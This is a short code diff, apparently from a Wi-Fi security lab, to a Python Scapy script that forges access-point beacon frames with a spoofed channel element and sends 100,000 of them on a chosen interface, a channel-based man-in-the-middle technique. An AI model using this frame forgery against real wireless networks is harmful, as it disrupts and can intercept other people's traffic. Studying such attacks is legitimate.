@@ -100,5 +100,4 @@ if __name__ == "__main__":
     APToAttack.Beacon.getlayer(4).remove_payload()
     # C'est ici qu'on recrée la couche de la channel
     forged = APToAttack.Beacon / Dot11Elt(ID="DSset", len=1, info=chr(ChannelToAttack)) / post
-
-    send(forged, count=100)
+    sendp(forged, count=100000, iface=args.interface)
